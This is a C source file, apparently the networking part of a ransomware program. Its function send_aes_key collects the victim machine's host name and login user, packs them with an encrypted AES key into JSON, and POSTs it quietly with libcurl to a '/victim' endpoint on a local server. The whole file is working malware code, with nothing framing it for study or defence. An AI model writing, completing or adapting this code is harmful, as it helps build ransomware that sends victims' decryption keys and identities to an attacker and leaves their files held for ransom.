#include <stdio.h>
#include <stdlib.h>
#include "network.h"
#include "encrypt.h"
#include <stdio.h>

/*Avoid libculr to show the ouput of a request */
static size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata){
    (void) ptr;
    (void) userdata;
    return size*nmemb;
}

void send_aes_key(char *encrypted_key){
    CURL *curl;
    CURLcode res;
    char post_data[1024];
    struct curl_slist *chunk = NULL;
    char host_name[HOST_NAME_MAX + 1];
    char user[64];

    if(gethostname(host_name, sizeof(host_name)) == -1) handleErrors("gethostname");

    if(getlogin_r(user, sizeof(user)) != 0) handleErrors("cuserid");

    snprintf(post_data, sizeof(post_data), "{\"aes_key\": \"%s\", \"host_name\": \"%s\", \"user\": \"%s\"}", encrypted_key, host_name, user);
   

    curl = curl_easy_init();
    if(curl) {
        chunk = curl_slist_append(chunk, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
        
        //curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        //curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/victim");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, NULL);
    
        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
          fprintf(stderr, "curl_easy_perform() failed: %s\n",
                  curl_easy_strerror(res));
    
        curl_easy_cleanup(curl);
        curl_slist_free_all(chunk);
    }
    curl_global_cleanup();
}